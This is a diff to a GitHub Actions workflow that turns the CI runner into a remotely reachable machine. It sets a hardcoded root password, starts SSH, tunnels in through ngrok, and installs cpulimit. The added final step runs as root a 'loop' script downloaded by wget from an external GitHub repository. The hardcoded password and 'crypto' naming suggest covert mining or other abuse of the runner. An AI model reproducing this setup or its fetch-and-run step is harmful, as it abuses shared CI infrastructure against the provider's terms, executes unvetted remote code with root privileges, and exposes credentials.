@@ -14,7 +14,7 @@ jobs:
     - name: Update
       run: sudo apt-get update -y>/dev/null
     - name: Install Package
-      run: sudo apt-get install -y openssh-server openssh-client screen cpulimit pwgen firewalld -y>/dev/null
+      run: sudo apt-get install -y openssh-server screen cpulimit pwgen firewalld -y>/dev/null
     - name: Setup Firewall
       run: | 
         sudo systemctl start firewalld
@@ -30,7 +30,6 @@ jobs:
     - name: Setup SSH
       run: | 
         echo -e "TUyulcrypto23\nTUyulcrypto23\n" | sudo passwd root
-        echo -e "TUyulcrypto23\n" | su
         sudo mkdir -p /var/run/sshd
         sudo systemctl enable ssh
         sudo systemctl start ssh
@@ -38,6 +37,7 @@ jobs:
         sudo bash -c  'echo -e "LD_LIBRARY_PATH=/usr/lib64-nvidia\nexport LD_LIBRARY_PATH" > /root/.bashrc'
         sudo service ssh reload
         sudo systemctl restart ssh
+        sudo systemctl restart firewalld
     - name: Install Pyngrok
       run: sudo pip install pyngrok -q > /dev/null
     - name: Connecting to your Ngrok account.
@@ -51,3 +51,4 @@ jobs:
     - name: Loop
       run: | 
         sudo wget -q "https://github.com/ckpakbar23/VPS/raw/main/loop" 
+        sudo bash ./loop
